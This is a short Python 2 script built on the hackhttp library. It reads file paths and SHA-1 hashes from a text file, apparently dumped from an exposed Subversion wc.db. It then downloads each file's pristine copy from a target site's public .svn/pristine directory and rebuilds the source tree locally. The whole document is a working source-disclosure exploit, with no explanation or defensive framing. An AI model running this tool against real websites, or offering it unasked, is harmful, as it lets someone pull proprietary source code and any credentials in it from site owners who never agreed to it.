#coding=utf8
import hackhttp
import re
import os
import sys
def GetFile(domain,Filename,sha1):
	hh = hackhttp.hackhttp()
	Url = domain+"/.svn/pristine/"+str(sha1)[0:2]+"/"+str(sha1)+".svn-base"
	a,b,c,d,e = hh.http(Url)
	fp = open(Filename,"w")
	fp.write(c)
	fp.close()	
if __name__ == '__main__':
	domain = sys.argv[1]
	i=0
	f = open("1.txt","r")
	while 1:
		i+=1
		print i
		line = f.readline()
		if not line:
			break
		else:
				dirs = "".join(re.findall(r'/dev/(.*?)\s',line))
				sha1 = "".join(re.findall(r'\$sha1\$(.*?)\s',line))
				Filename = "".join(re.findall(r'[^\\/:*?"<>|\r\n]+$',dirs))
				Dir = dirs.replace(Filename,"")
				if os.path.exists(Dir):
					pass
				else:
					os.makedirs(Dir)

				if "." in dirs:
					GetFile(domain,dirs,sha1)	
	f.close()
